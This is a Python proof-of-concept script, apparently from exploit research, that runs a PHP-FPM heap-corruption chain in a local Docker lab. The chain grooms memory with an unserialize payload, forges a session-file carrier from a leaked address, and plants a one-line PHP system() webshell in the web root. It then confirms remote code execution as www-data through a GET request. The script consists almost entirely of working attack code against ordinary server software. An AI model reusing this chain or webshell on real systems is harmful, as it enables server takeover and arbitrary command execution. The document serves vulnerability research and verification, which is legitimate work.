#!/usr/bin/env python3
"""Fire the K-SEATED (adaptive) ps_files->basedir file-write as CODE.

Same fire step as verify_fpm_kfree_fire.py but driven by the adaptive single-carrier
forge (measures d_choff at runtime via the observer leak stand-in, adapts the
carrier). Confirms the GET-fire finisher is write-variant-agnostic and composes
with the d_choff-adaptive write.

PASS = file written AND GET carries per-trial nonce + uid=...(www-data) AND worker
survived. Fresh-container-per-trial; loud (no silent skip on a different d_choff --
the adaptive forge consumes whatever value the observer reports).

Lab: profile fpmfire:
    docker compose -f docker-compose.fpm-avenues.yml --profile fpmfire up -d --build
    # nginx 127.0.0.1:18085
Run:
    python3 -I poc/chains/verify_fpm_kseated_fire.py [ntrials]

Measured: 5/5; independently re-verified 3/3 (observed d_choff=0x6a000, the
host-load jitter, handled correctly by the adaptive forge).
"""
import os
import re
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_HERE)  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from primitives.write.ps_files_single_carrier_forge import (  # noqa: E402
    build_carrier, session_record, stage_parts)
from primitives.groom.script_unserialize_oom_arm import cochunk_payload  # noqa: E402

REPO = os.path.dirname(_POC_ROOT)
COMPOSE_FILE = os.path.join(REPO, "docker-compose.fpm-avenues.yml")
LAB = os.path.join(REPO, "lab", "fpmfire")
BASE = "http://127.0.0.1:18085"
PROFILE = "fpmfire"
CONTAINER = "p2s-fpmfire-fpm"
SID = "sess0000000000000000000000000001"
SF = "/tmp/sess_" + SID
PS_FILES_CHOFF = 0x56208
CH = ~0x1fffff
WEBSHELL = b"<?php system($_GET[0]);?>"
TARGET = "/var/www/html/pub/pwned.php"
URLPATH = "/pub/pwned.php"


def comp(*a, t=180):
    return subprocess.run(["docker", "compose", "-f", COMPOSE_FILE, "--profile", PROFILE, *a],
                          cwd=REPO, capture_output=True, text=True, timeout=t)


def dx(*c, t=30):
    return subprocess.run(["docker", "exec", CONTAINER, *c], capture_output=True, text=True, timeout=t).stdout


def http(path, data=None, ct=None, t=90, cookie=False):
    req = urllib.request.Request(BASE + path, data=data)
    if ct:
        req.add_header("Content-Type", ct)
    if cookie:
        req.add_header("Cookie", "PHPSESSID=" + SID)
    try:
        with urllib.request.urlopen(req, timeout=t) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return None, repr(e).encode()


def wpid():
    s, b = http("/probe.php", t=8)
    return b.split(b":", 1)[1].decode().strip() if (s == 200 and b.startswith(b"ALIVE:")) else None


def ready():
    for _ in range(80):
        if wpid():
            return True
        time.sleep(0.5)
    return False


def multipart(parts, bnd=b"----l2"):
    out = []
    for name, val, fn in parts:
        h = b'--' + bnd + b'\r\nContent-Disposition: form-data; name="' + name + b'"'
        if fn is not None:
            h += b'; filename="' + fn + b'"\r\nContent-Type: application/octet-stream'
        h += b'\r\n\r\n'
        out.append(h + val + b'\r\n')
    out.append(b'--' + bnd + b'--\r\n')
    return b''.join(out), 'multipart/form-data; boundary=' + bnd.decode()


def chunk_base():
    for tok in dx("php", "/tmp/observer.php").split():
        if tok.startswith("unser.data="):
            return int(tok.split("=")[1], 16)
    return None


def trial(i):
    comp("down", t=90)
    if comp("up", "-d", "--build").returncode != 0 or not ready():
        return "SKIP (boot)", False
    subprocess.run(["docker", "cp", os.path.join(LAB, "observer.php"), f"{CONTAINER}:/tmp/observer.php"],
                   capture_output=True)
    p0 = wpid()
    dx("sh", "-c", f"printf %s '{session_record().decode()}' > {SF}; chown www-data {SF}")
    body, ct = multipart([(b"d", cochunk_payload(1100, 4000000), None)])
    http("/arm.php", data=body, ct=ct)
    d = chunk_base()
    if not d:
        return "no dangle", False
    K = d & CH
    carrier = build_carrier(K, d & 0x1fffff, PS_FILES_CHOFF, TARGET, k=0)   # ADAPTIVE
    body, ct = multipart(stage_parts(carrier, WEBSHELL))
    http("/echo.php", data=body, ct=ct, cookie=True)
    ls = dx("sh", "-c", f"ls {TARGET} 2>&1").strip()
    wrote = TARGET in ls and "No such" not in ls
    nonce = "FIRE%08x" % (int.from_bytes(os.urandom(4), "big"))
    s, b = http(f"{URLPATH}?0={urllib.parse.quote(f'echo {nonce};id')}", t=15)
    body2 = b.decode("latin-1", "replace") if b else ""
    fired = (nonce in body2) and bool(re.search(r"uid=\d+\(www-data\)", body2))
    p1 = wpid()
    survived = p1 is not None and p1 == p0
    ok = wrote and fired and survived
    return (f"d_choff=0x{d & 0x1fffff:x} wrote={wrote} fired={fired} survived={survived} "
            f"p0={p0} p1={p1} nonce={'HIT' if nonce in body2 else 'MISS'} "
            f"-> {'PASS' if ok else 'FAIL'}"), ok


def main():
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 5
    if subprocess.run(["docker", "version"], capture_output=True).returncode != 0:
        print("SKIP: docker unavailable"); return
    results = []
    for i in range(1, n + 1):
        line, ok = trial(i)
        print(f"trial {i}: {line}", flush=True)
        results.append(ok)
    comp("down", t=90)
    npass = sum(results)
    print(f"\n{'PASS' if npass == n else 'FAIL'}: {npass}/{n} K-seated adaptive fired RCE")


if __name__ == "__main__":
    main()
